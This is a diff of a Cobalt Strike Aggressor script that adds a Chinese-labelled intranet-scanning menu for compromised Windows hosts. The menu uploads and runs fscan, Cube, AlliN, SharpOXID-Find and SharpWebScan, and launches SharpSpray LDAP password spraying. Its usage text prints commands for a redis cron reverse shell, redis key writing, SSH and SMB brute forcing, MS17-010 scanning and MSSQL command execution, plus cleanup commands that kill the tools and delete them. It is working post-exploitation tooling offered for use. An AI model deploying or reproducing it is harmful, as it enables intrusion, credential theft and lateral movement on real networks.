@@ -1,8 +1,9 @@
 menu "☆ 内网扫描" {
   menu "Fscan (内网大保健)" {
     item "上传 Fscan" {
+			blog($1, "\c9=========== 上传 Fscan ==========");
       $bid = $1;
-      $dialog = dialog("上传fscan", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &fscan);
+      $dialog = dialog("上传fscan", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &fscan);
       dialog_description($dialog, "支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息等。项目地址：https://github.com/shadow1ng/fscan");
       drow_text($dialog, "UploadPath",  "上传路径: ");
       dbutton_action($dialog, "上传");
@@ -11,29 +12,30 @@ menu "☆ 内网扫描" {
     sub fscan {
       bcd($bid, $3['UploadPath']);
       if (-is64 $bid['id']) {
-        bupload($bid, script_resource("/scripts/IntrScan/fscan/x64/fscan.exe"));
+        bupload($bid, script_resource("/scripts/IntrScan/x64/fscan.exe"));
       }else{
-        bupload($bid, script_resource("/scripts/IntrScan/fscan/x86/fscan.exe"));
+        bupload($bid, script_resource("/scripts/IntrScan/x86/fscan.exe"));
       }      
     }
-    item "运行 Fscan"{
+    item "运行 Fscan" {
+			blog($1, "\c9=========== 运行 Fscan ==========");
       $bid = $1['@'];
-      btask($bid, "-------------------------------------------------------Fscan 使用方法------------------------------------------------------------", "");
-      btask($bid, "fscan.exe", "");      
-      btask($bid, "fscan.exe -h 192.168.1.1/24                      (默认使用全部模块)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub       (redis 写私钥)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -c whoami            (ssh 爆破成功后，命令执行)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ssh -p 2222       (指定模块ssh和端口)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ms17010           (指定模块)", "");
-      btask($bid, " ", "");
-      btask($bid, "-h 192.168.1.1/24 (C段)", "");
-      btask($bid, "-h 192.168.1.1/16 (B段)", "");
-      btask($bid, "-h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息)", "");
-      btask($bid, "-hf ip.txt        (以文件导入)", "");
+      btask($bid, "Fscan", "");      
+      btask($bid, "fscan.exe -h 192.168.1.1/24                                    (默认使用全部模块)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/16                                    (B段扫描)", "");
+      btask($bid, "其他用法：", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -np -no -nopoc                     (跳过存活检测、不保存文件、跳过web poc扫描)", "");            
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub                     (redis 写公钥)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666               (redis 计划任务反弹shell)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt     (加载指定文件的用户名、密码来进行爆破)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt                      (指定扫描结果保存路径,默认保存在当前路径)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/8                                     (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -m smb -pwd password               (smb密码碰撞)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -c whoami                          (ssh 爆破成功后，命令执行)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ssh -p 2222                     (指定模块ssh和端口)", "");
+      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ms17010                         (指定模块)", "");
       btask($bid, " ", "");
       btask($bid, "fscan.exe -h      (查看完整使用方法)", "");
-      btask($bid, " ", "");      
       $dialog = dialog("运行fscan",%(exec => "fscan.exe -h 192.168.1.1/24 -o out.txt", bid => $bid),&fscan_run);
       dialog_description($dialog, "请在下方输入运行指令：");
       drow_text($dialog, "exec", "Exec: ");
@@ -44,72 +46,139 @@ menu "☆ 内网扫描" {
       $exec = $3['exec'];
       brun($bid, "$exec");
     }
-    item "删除 Fscan"{
+    item "删除 Fscan" {
+			blog($1, "\c9=========== 删除 Fscan ==========");
       $bid = $1['@'];
       bshell($bid, "taskkill -f /im fscan.exe & del /f /s /q fscan.exe & del /f /s /q out.txt");
     }
   }
 
-  menu "Crack (内网爆破)" {
-    item "上传 Crack" {
-        $bid = $1;
-        $dialog = dialog("上传crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
-        dialog_description($Dialog, "支持爆破ftp，ssh，smb，mssql，mysql, postgresql,爆破完毕会在当前目录生成result.txt。fork地址：https://github.com/oksbsb/crack");
-        drow_text($dialog, "UploadPath",  "上传路径: ");
-        dbutton_action($dialog, "上传");
-        dialog_show($dialog);
+  menu "Cube（模块化探测）"{
+    item "上传 Cube" {
+			blog($1, "\c9=========== 上传 Cube ==========");
+      $bid = $1;
+      $dialog = dialog("上传 Cube", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &cube_upload);
+      dialog_description($dialog, "内网渗透测试工具，弱密码爆破、信息收集和漏洞扫描。项目地址：https://github.com/JKme/cube");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
     }
-      sub crack {
-        bcd($bid, $3['UploadPath']);
-        bupload($bid, script_resource("/scripts/IntrScan/crack.exe"));
-      }
-    item "运行 Crack"{
-        $bid = $1['@'];
-        btask($bid, "--------------------------------------------------------Crack 使用方法------------------------------------------------------------", "");
-        btask($bid, "crack.exe", "");
-        btask($bid, "-i string", "");
-        btask($bid, "   ip addr 192.168.1.1/24，192.168.1-255，192.168.1.1", "");
-        btask($bid, "-p string", "");
-        btask($bid, "   port 21,22，445，3306，1433", "");
-        btask($bid, "-U string", "");
-        btask($bid, "   filename list or username", "");
-        btask($bid, "-P string", "");
-        btask($bid, "   filename list or username", "");
-        btask($bid, "-s string", "");
-        btask($bid, "   service ftp  ssh，smb，mssql，mysql, postgresql   default  only scan tcp port (default \"scan\")", "");
-        btask($bid, "-t int", "");
-        btask($bid, "   thread (default 100)", "");
-        btask($bid, " ", "");        
-        $Dialog = dialog("运行crack",%(ip => "192.168.1.1/24", port => "445", username => "filename list or username", password => "filename list or password", type => "smb", thread => "100",bid => $bid),&crack_run);
-        dialog_description($Dialog, "支持爆破ftp，ssh，smb，mssql，mysql, postgresql,爆破完毕会在当前目录生成result.txt。");
-        drow_text($Dialog, "ip", "ip: ");
-        drow_text($Dialog, "port", "port: ");
-        drow_text($Dialog, "username", "username: ");
-        drow_text($Dialog, "password", "password: ");
-        drow_text($Dialog, "type", "type: ");
-        drow_text($Dialog, "thread", "thread: ");
-        dbutton_action($Dialog, "运行");
-        dialog_show($Dialog);
+    sub cube_upload {
+      bcd($bid, $3['UploadPath']);
+      if (-is64 $bid['id']) {
+        bupload($bid, script_resource("/scripts/IntrScan/x64/cube.exe"));
+      }else{
+        bupload($bid, script_resource("/scripts/IntrScan/x86/cube.exe"));
+      }      
+    } 
+    item "运行 Cube" {
+			blog($1, "\c9=========== 运行 Cube ==========");
+      $bid = $1['@'];
+      btask($bid, "", "");
+      btask($bid, "- Probe 内网信息收集模块", "");
+      btask($bid, "ALL选项默认加载插件: docker,rmi,oxid,netbios,ntlm-smb,zookeeper", "");
+      btask($bid, "其他可用插件：netbios，ms17010，smbghost，ntlm-wmi，ntlm-winrm，ntlm-mssql，dubbo，ping", "");
+      btask($bid, "cube.exe probe -x ALL -i 192.168.2.1/24", "");     
+      btask($bid, "cube.exe probe -x oxid -i 192.168.2.1/24", "");
+      btask($bid, "cube.exe probe -x oxid,ms17010 -i 192.168.2.1/24", "");
+      btask($bid, "", "");
+      btask($bid, "- Crack 弱密码爆破模块", "");
+      btask($bid, "可用插件：ssh，mysql，redis，elastic，ftp，httpbasic，mongo，mssql，smb，postgres", "");
+      btask($bid, "cube.exe crack -u root -p root -i 192.168.1.1 -x ALL //加载全部可组合插件", "");            
+      btask($bid, "cube.exe crack -u root -p root -i 192.168.1.1 -x ssh", "");
+      btask($bid, "cube.exe crack -u root -p root -i 192.168.1.1 -x ssh --port 2222", "");
+      btask($bid, "cube.exe crack -u root,ubuntu -p 123,000111,root -x ssh -i 192.168.1.1", "");
+      btask($bid, "cube.exe crack -u root -p root -i 192.168.1.1/24 -x ssh", "");
+      btask($bid, "cube.exe crack -u root --pass-file pass.txt -i 192.168.1.1/24 -x ssh,mysql", "");
+      btask($bid, "phpmyadmin、httpbasic、jenkins、zabbix插件只能单独使用，不可组合:", "");
+      btask($bid, "cube.exe crack -u root --pass-file pass.txt -i http://192.168.1.1 -x phpmyadmin", "");
+      btask($bid, "cube.exe crack -u root --pass-file pass.txt -i http://192.168.1.1 -x zabbix", "");
+      btask($bid, "", "");
+      btask($bid, "- Sqlcmd 命令执行模块", "");
+      btask($bid, "cube.exe sqlcmd -x mssql://172.16.157.163 -usa -p123456 -e \"whoami\"", "");
+      btask($bid, "cube.exe sqlcmd -x mssql-wscript://172.16.157.163 -usa -p123456 -e \"whoami\"", "");
+      btask($bid, "cube.exe sqlcmd -x mssql-com://172.16.157.163 -usa -p123456 -e \"whoami\"", "");
+      btask($bid, "cube.exe sqlcmd -x mssql-clr://172.16.157.163 -usa -p123456 -e \"whoami\"", "");
+      $dialog = dialog("运行 Cube",%(exec => "cube.exe probe -x ALL -i 192.168.1.1/24", bid => $bid),&cube_run);
+      dialog_description($dialog, "请在下方输入运行指令：");
+      drow_text($dialog, "exec", "Exec: ");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);   
     }
-    sub crack_run{
-        local('$Name $port $username $password $type $thread');
-        $Name = $3['ip'];
-        $port = replace($3['port'], "\"", "");
-        $username = $3['username'];
-        $password = $3['password'];
-        $type = $3['type'];
-        $thread = $3['thread'];
-        bshell($bid, "crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread");
+    sub cube_run{
+      $exec = $3['exec'];
+      brun($bid, "$exec");
     }
-    item "删除 Crack"{
-        local('$bid');
-        foreach $bid ($1){
-          bshell($1, "taskkill -f /im crack.exe & del /f /s /q crack.exe");
-        }
+    item "删除 Cube" {
+			blog($1, "\c9=========== 删除 Cube ==========");
+      $bid = $1['@'];
+      bshell($bid, "taskkill -f /im cube.exe & del /f /s /q cube.exe");
     }
   }
 
-  item "SharpWebScan (探测web服务)" {
+  menu "Allin（辅助灵活扫描）"{
+    item "上传 Allin" {
+			blog($1, "\c9=========== 上传 Allin ==========");
+      $bid = $1;
+      $dialog = dialog("上传 Allin", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &allin_upload);
+      dialog_description($dialog, "一款 Python 版无依赖扫描器，被动识别站点的一些架构信息，组件信息，框架信息，指纹数量1000+。项目地址：https://github.com/P1-Team/AlliN");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub allin_upload {
+      bcd($bid, $3['UploadPath']);
+      if (-is64 $bid['id']) {
+        bupload($bid, script_resource("/scripts/IntrScan/x64/Allin.exe"));
+      }else{
+        bupload($bid, script_resource("/scripts/IntrScan/x86/Allin.exe"));
+      }      
+    } 
+    item "运行 Allin" {
+			blog($1, "\c9=========== 运行 Allin ==========");
+      $bid = $1['@'];
+      btask($bid, "详细使用说明：https://github.com/P1-Team/AlliN", "");
+      btask($bid, "AlliN.exe -m oxid --host 192.168.1.1/24 --nobar                  （获取远程主机网卡地址）", "");  
+      btask($bid, "AlliN.exe --host 10.1.1.1/24 -m 17scan --nobar                   （17010 扫描）", "");
+      btask($bid, "AlliN.exe --host 192.168.1.1/24 -m 0708scan -p 3389 --nobar      （0708 扫描）", "");
+      btask($bid, "AlliN.exe --host 10.1.1.1/24 -p 80 -m pscan --nobar              （-p 指定端口 全端口使用参数-p-）", "");
+      btask($bid, "AlliN.exe --host 10.1.1.1/24 -p 80 --nobar                       （Web title 扫描）", "");
+      btask($bid, "AlliN.exe --host 192.168.1.1/24 -p 443 -m bakscan --nobar        （扫描后台）", "");
+      btask($bid, "AlliN.exe --host 192.168.1.1/24 -p 443 -m bakscan --dd --nobar   （head 方式扫后台）", "");  
+      $dialog = dialog("运行 Allin",%(exec => "AlliN.exe -m oxid --host 192.168.1.1/24 --nobar", bid => $bid),&allin_run);
+      dialog_description($dialog, "请输入指令后确认已添加 --nobar 参数：");
+      drow_text($dialog, "exec", "Exec: ");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);   
+    }
+    sub allin_run{
+      $exec = $3['exec'];
+      brun($bid, "$exec");
+    }
+    item "删除 Allin" {
+			blog($1, "\c9=========== 删除 Allin ==========");
+      $bid = $1['@'];
+      bshell($bid, "taskkill -f /im Allin.exe & del /f /s /q Allin.exe");
+    }
+  }
+
+  item "SharpOXID-Find (OXID 探测)" {
+			blog($1, "\c9=========== SharpOXID-Find (OXID 探测) ==========");
+      $bid = $1['@'];
+      $dialog = dialog("SharpOXID-Find", %(ip => "192.168.1.1/24",bid => $bid), &SharpOXID-Find);
+      dialog_description($dialog, "OXID 解析器，用于探测多网口机器（依赖于 135 端口）,-i 扫描指定ip,-c 扫描C段。");
+      drow_combobox($dialog, "type", "type:", @("-c","-i"));
+      drow_text($dialog, "ip", "ip:  ");			
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+  }
+  sub SharpOXID-Find {
+      $arg = join(' ',  @($3['type'],$3['ip']));
+      bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpOXID-Find.exe"), $arg);
+  }
+
+  item "SharpWebScan (Web 探测)" {
+			blog($1, "\c9=========== SharpWebScan (Web 探测) ==========");
     $bid = $1['@'];
     $dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
     dialog_description($dialog, "扫描IP或C段的Web服务，获取Title，可自定义多端口扫描，返回web地址和title。项目地址：https://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan");
@@ -119,75 +188,13 @@ menu "☆ 内网扫描" {
     dbutton_action($dialog, "运行");
     dialog_show($dialog);
   }
-  sub SharpWebScan {
+  sub SharpWebScan (Web 服务) {
     $arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
     bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpWebScan.exe"), $arg);
   }
 
-  menu "TailorScan (缝合怪内网扫描器)" {
-    item "上传TailorScan" {
-      $bid = $1;
-      $dialog = dialog("上传TailorScan", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &TailorScan);
-      dialog_description($dialog, "支持端口扫描，识别服务，获取title，扫描多网卡，ms17010扫描，icmp存活探测。项目地址：https://github.com/uknowsec/TailorScan");
-      drow_text($dialog, "UploadPath",  "上传路径: ");
-      dbutton_action($dialog, "上传");
-      dialog_show($dialog);
-    }
-    sub TailorScan {
-      bcd($bid, $3['UploadPath']);
-      if (-is64 $bid['id']) {
-        bupload($bid, script_resource("/scripts/IntrScan/TailorScan/x64/TailorScan.exe"));
-      }else{
-        bupload($bid, script_resource("/scripts/IntrScan/TailorScan/x86/TailorScan.exe"));
-      }      
-    }
-    item "运行TailorScan"{
-			$bid = $1['@'];
-      btask($bid, " ", "");
-      btask($bid, "----------------------------------------------------TailorScan 使用方法------------------------------------------------------------", "");
-      btask($bid, "TailorScan.exe", "");
-      btask($bid, " ", "");
-      btask($bid, "扫描IP格式支持：", "");
-      btask($bid, "   192.168.1.1", "");
-      btask($bid, "   192.168.1.1-10", "");
-      btask($bid, "   192.168.1.*", "");
-      btask($bid, "   192.168.1.0/24", "");
-      btask($bid, " ", "");
-      btask($bid, "端口支持自定义列表，用','分隔，如：", "");
-      btask($bid, "   21,22,80-99,8000-8080", "");
-      btask($bid, " ", "");
-      btask($bid, "端口扫描，支持tcp、icmp:", "");
-      btask($bid, "   TailorScan.exe portscan 192.168.0.1/24 80,8080 tcp", "");
-      btask($bid, "   TailorScan.exe portscan 192.168.0.1/24 tcp", "");
-      btask($bid, " ", "");
-      btask($bid, "永恒之蓝探测：", "");
-      btask($bid, "   TailorScan.exe ms17010 -i 192.168.0.1", "");
-      btask($bid, "   TailorScan.exe ms17010 -n 192.168.0.1/24", "");
-      btask($bid, " ", "");
-      btask($bid, "OXID Find：", "");
-      btask($bid, "   TailorScan.exe oxidfind -i 192.168.0.1", "");
-      btask($bid, "   TailorScan.exe oxidfind -n 192.168.0.1/24", "");
-      btask($bid, " ", "");
-      btask($bid, "ICMP check：", "");
-      btask($bid, "   TailorScan.exe icmpcheck 192.168.0.1/24", "");
-      btask($bid, " ", "");
-			$dialog = dialog("运行TailorScan",%(exec => "TailorScan.exe ms17010 -n 192.168.0.1/24", bid => $bid),&TailorScan_run);
-			dialog_description($dialog, "注意控制台输出的使用说明，直接在下方输入执行指令：");
-      drow_text($dialog, "exec", "Exec: ");
-			dbutton_action($dialog, "运行");
-			dialog_show($dialog);
-		}
-		sub TailorScan_run{
-      $exec = $3['exec'];
-			brun($bid, "$exec");
-		}
-    item "删除TailorScan"{
-			$bid = $1['@'];
-      bshell($bid, "taskkill -f /im TailorScan.exe & del /f /s /q TailorScan.exe");
-    }
-  }
-
   item "SharpSpray (域内密码爆破)" {
+			blog($1, "\c9=========== SharpSpray (域内密码爆破) ==========");
     $bid = $1['@'];
     $dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "1",bid => $bid), &SharpSpray);
     dialog_description($dialog, "使用LDAP对域的所有用户执行密码喷雾攻击。seeds：指定几个密码生成字典，逗号分隔。passwords：指定密码爆破，可多个密码，逗号分隔。delay：密码喷雾的延迟，毫秒为单位。sleep：密码猜测之间sleep周期分钟数。项目地址：https://github.com/jnqpblc/SharpSpray");
